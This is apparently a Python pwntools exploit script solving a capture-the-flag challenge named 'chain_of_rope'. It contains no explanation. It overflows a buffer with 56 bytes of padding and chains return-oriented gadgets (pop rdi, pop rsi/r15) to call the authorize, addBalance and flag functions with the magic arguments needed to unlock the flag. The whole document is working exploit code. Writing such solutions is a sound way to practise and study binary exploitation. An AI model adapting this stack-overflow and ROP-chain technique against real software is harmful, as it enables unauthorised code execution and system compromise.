from pwn import *

e = ELF('./chain_of_rope')
p = process('./chain_of_rope')

flag_addr = e.symbols['flag']

arg1_addr = 0xba5eba11
arg2_addr = 0xbedabb1e
arg_addr = 0xdeadbeef
pop_rdi_addr = 0x00401403
pop_rsi_pop_r15_addr = 0x00401401
authorize_addr = e.symbols['authorize']
addBalance_addr = e.symbols['addBalance']

print "arg1: " + hex(arg1_addr)
print "arg2: " + hex(arg2_addr)
print "pop rdi: " + hex(pop_rdi_addr)
print "pop rsi: " + hex(pop_rsi_pop_r15_addr)
print "authorize: " + hex(authorize_addr)
print "addBalance: " + hex(addBalance_addr)

payload = 'A'*56
payload += p64(authorize_addr)
payload += p64(pop_rdi_addr)
payload += p64(arg_addr)
payload += p64(addBalance_addr)
payload += p64(pop_rdi_addr)
payload += p64(arg1_addr)
payload += p64(pop_rsi_pop_r15_addr)
payload += p64(arg2_addr)
payload += p64(0x41)
payload += p64(flag_addr)

p.sendline('1')
p.sendline(payload)
p.interactive()
